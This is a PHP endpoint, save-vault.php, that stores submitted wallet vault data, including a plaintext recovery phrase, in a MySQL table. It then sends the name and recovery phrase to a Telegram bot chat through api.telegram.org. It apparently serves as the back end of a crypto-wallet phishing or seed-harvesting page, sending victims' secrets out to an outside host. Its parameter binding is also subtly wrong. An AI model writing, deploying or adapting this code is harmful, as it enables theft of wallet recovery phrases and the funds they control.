<?php
// save-vault.php

// Database configuration
$dbHost = 'localhost';       // Your DB host
$dbUser = 'your_username';   // Your DB username
$dbPass = 'your_password';   // Your DB password
$dbName = 'your_database';   // Your database name

// Telegram Bot configuration
$telegramToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
$telegramChatId = 'YOUR_CHAT_ID';   // Replace with your chat ID

// Connect to database
$conn = new mysqli($dbHost, $dbUser, $dbPass, $dbName);
if ($conn->connect_error) {
    http_response_code(500);
    echo json_encode(['error' => 'Database connection failed']);
    exit;
}

// Read JSON input
$input = json_decode(file_get_contents('php://input'), true);

if (!isset($input['payload'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid input']);
    exit;
}

// Extract payload
$encryptedPayload = json_encode($input['payload']); // Store as JSON string

// Additional info (optional, can be sent from frontend)
$name = isset($input['name']) ? $conn->real_escape_string($input['name']) : 'Unknown';
$recoveryPhrase = isset($input['recovery_phrase']) ? $conn->real_escape_string($input['recovery_phrase']) : '';
$createdAt = date('Y-m-d H:i:s');

// Save to database
$stmt = $conn->prepare("INSERT INTO vaults (name, recovery_phrase, created_at, encrypted_payload) VALUES (?, ?, ?, ?)");
$stmt->bind_param('ssds', $name, $recoveryPhrase, $createdAt, $encryptedPayload);

if (!$stmt->execute()) {
    http_response_code(500);
    echo json_encode(['error' => 'Failed to save data']);
    exit;
}

// Send message to Telegram
$message = "🔐 New Vault Saved
";
$message .= "Name: $name
";
$message .= "Created: $createdAt
";
$message .= "Recovery Phrase: $recoveryPhrase
";

$telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    'chat_id' => $telegramChatId,
    'text' => $message,
]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Check Telegram response
if (!$response) {
    // Optional: handle Telegram send failure
}

// Respond success
echo json_encode(['success' => true]);

// Close connection
$conn->close();
?>
